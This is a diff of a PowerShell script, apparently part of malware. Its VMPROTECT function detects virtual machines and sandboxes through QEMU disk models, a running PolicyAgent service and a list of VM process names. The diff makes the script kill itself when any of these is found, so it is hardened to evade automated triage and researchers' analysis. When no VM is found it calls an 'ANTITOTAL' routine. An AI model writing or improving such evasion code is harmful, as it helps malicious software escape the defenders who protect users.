@@ -65,14 +65,14 @@ function ram_check {
     }
 }
 
-
 function VMPROTECT {
     ram_check
+    #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
         Stop-Process $pid -Force   
     }
-    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Running"}) {
+    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
         Stop-Process $pid -Force
     } 
     $processnames = @(
@@ -124,7 +124,11 @@ function VMPROTECT {
         "xenservice"
     )
     $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-    Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+    if ($null -ne $detectedProcesses) {
+        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+        Stop-Process $pid -Force
+    }
+
     if ($null -eq $detectedProcesses) {
         Invoke-ANTITOTAL
         Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
